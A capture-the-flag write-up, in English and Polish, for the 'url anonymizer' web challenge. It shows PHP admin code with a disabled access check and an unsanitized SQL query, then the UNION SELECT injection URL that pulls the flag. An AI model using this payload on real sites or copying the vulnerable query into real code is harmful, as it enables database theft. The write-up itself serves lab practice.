# url anonymizer (web, 200p)

###eng
[pl](#pl-version)

in description of the task we got uri pointing to source of admin.php and information that the application provides url shortening functionality.
source of file : http://10.13.37.12/admin.php?source

```php
<?php
include_once('config.php');

if(isset($_get['source']) && $_server['script_filename'] == __file__) {
    highlight_file(__file__);
    die();
}

//lazy admin approach to "authenticate"
if($_server['remote_addr'] !== '127.0.0.1') {
    //die('you are not allowed.');
}

$title      = '';
$content = '';
$page    = @$_request['page'];
        
switch($page) {
    case '':
    default:
        
    break;
    case 'reports':
        $title = 'reports';
        $q = $db->query('select * from `reports` where view=0');
        while($row = $q->fetch_array()) {
            $content .= '<div class="r"><a href="http://localhost/admin.php?page=report&id='.$row['hash'].'">report '.$row['id'].'</a><a href="http://localhost/admin.php?page=hide&id='.$row['id'].'">hide</a></div>';
        }
    break;
    case 'hide':
        $id = intval(@$_request['id']);
        $db->query('update reports set view=1 where id='.$id);
    break;
    case 'report':
        if(isset($_get['id'])) {
            $r        = $db->query('select * from `urls` where hash="'.$_get['id'].'"');
            $r        = $r->fetch_array();
            $content .= 'clicked: '.(intval($r['hits'])>0?'yes':'no');
            $content .= '<br>reported url: '.$r['url'];
            $db->query('update reports set view=1 where hash="'.$db->real_escape_string($_get['id']).'"');
        }else {
            die('invalid request.');
        }
    break;
}
echo showcontent($title, $content);
```

in general, we can see two different views , one where we can submit url to be shortened


[image extracted text: ssc llc
home
about
contact
super url anonymizer
url
http lisuper-long-url-to-shorten com
shorten
report link | aboutus
copyright @ shorter-system. all rights reserved_]


and the other place where we can submit wrongly working url


[image extracted text: ssc llc
home
about
contact
report url
you believe that an url is malicious
please submit it
and one of our administrators will review it:
url
report only hash of the anonymised url.
report
report link
aboutus
copyright @ shorter-system. all rights reserved_]


however, the most interesting part is the admin.php and we can see that inside 'report' section we have unsanitized sql injection, therefore we try to reach this url with already prepared query (union select) and get in response:


[image extracted text: clicked: yes
reported url: dctf{3obce3bb3c2b030c1480179046409729}
report link
aboutus
copyright @ shorter-system. all rights reserved]


url : http://10.13.37.12/admin.php?page=report&id=1%22%20union%20select%201,2,flag,4%20from%20flag%20where%201=%221

flag : dctf{30bce3bb3c2b030c1480179046409729}

###pl version

w opisie zadania otrzymaliśmy  uri wskazujący na źródło pliku admin.php i informacje że aplikacja dostarcza możliwość skracania adresów url.
źródło pliku : http://10.13.37.12/admin.php?source

```php
<?php
include_once('config.php');

if(isset($_get['source']) && $_server['script_filename'] == __file__) {
    highlight_file(__file__);
    die();
}

//lazy admin approach to "authenticate"
if($_server['remote_addr'] !== '127.0.0.1') {
    //die('you are not allowed.');
}

$title      = '';
$content = '';
$page    = @$_request['page'];
        
switch($page) {
    case '':
    default:
        
    break;
    case 'reports':
        $title = 'reports';
        $q = $db->query('select * from `reports` where view=0');
        while($row = $q->fetch_array()) {
            $content .= '<div class="r"><a href="http://localhost/admin.php?page=report&id='.$row['hash'].'">report '.$row['id'].'</a><a href="http://localhost/admin.php?page=hide&id='.$row['id'].'">hide</a></div>';
        }
    break;
    case 'hide':
        $id = intval(@$_request['id']);
        $db->query('update reports set view=1 where id='.$id);
    break;
    case 'report':
        if(isset($_get['id'])) {
            $r        = $db->query('select * from `urls` where hash="'.$_get['id'].'"');
            $r        = $r->fetch_array();
            $content .= 'clicked: '.(intval($r['hits'])>0?'yes':'no');
            $content .= '<br>reported url: '.$r['url'];
            $db->query('update reports set view=1 where hash="'.$db->real_escape_string($_get['id']).'"');
        }else {
            die('invalid request.');
        }
    break;
}
echo showcontent($title, $content);
```

po przejściu na  adres aplikacji, możemy zauważyc dwa widoki, jeden w którym możemy wysyłać url do skrócenia 

[image extracted text: ssc llc
home
about
contact
super url anonymizer
url
http lisuper-long-url-to-shorten com
shorten
report link | aboutus
copyright @ shorter-system. all rights reserved_]


i drugi widok, w którym możemy wysyłać źle działający url

[image extracted text: ssc llc
home
about
contact
report url
you believe that an url is malicious
please submit it
and one of our administrators will review it:
url
report only hash of the anonymised url.
report
report link
aboutus
copyright @ shorter-system. all rights reserved_]


jednal najciekawszym  elementem jest zasób admin.php w którym możemy zauważyć że w ramach case'a "report" mamy sql injection, więc staramy się wysłać zapytanie z przygotowanym zapytaniem (union select) i otrzymujemy w odpowiedzi :


[image extracted text: clicked: yes
reported url: dctf{3obce3bb3c2b030c1480179046409729}
report link
aboutus
copyright @ shorter-system. all rights reserved]


url : http://10.13.37.12/admin.php?page=report&id=1%22%20union%20select%201,2,flag,4%20from%20flag%20where%201=%221

flag : dctf{30bce3bb3c2b030c1480179046409729}
